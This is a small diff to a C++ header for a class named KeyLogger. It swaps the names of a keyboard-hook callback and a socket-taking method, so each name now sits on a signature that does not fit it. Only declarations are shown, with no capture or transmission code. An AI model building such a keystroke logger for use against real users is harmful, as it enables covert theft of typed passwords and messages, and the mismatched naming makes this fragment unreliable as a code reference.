@@ -12,6 +12,6 @@ public:
 	KeyLogger();
 	~KeyLogger();
 
-	static LRESULT CALLBACK recordKeyboard(int nCode, WPARAM wParam, LPARAM lParam);
-	void startListen(SOCKET sock);
+	static LRESULT CALLBACK startListen(int nCode, WPARAM wParam, LPARAM lParam);
+	void recordKeyboard(SOCKET sock);
 };
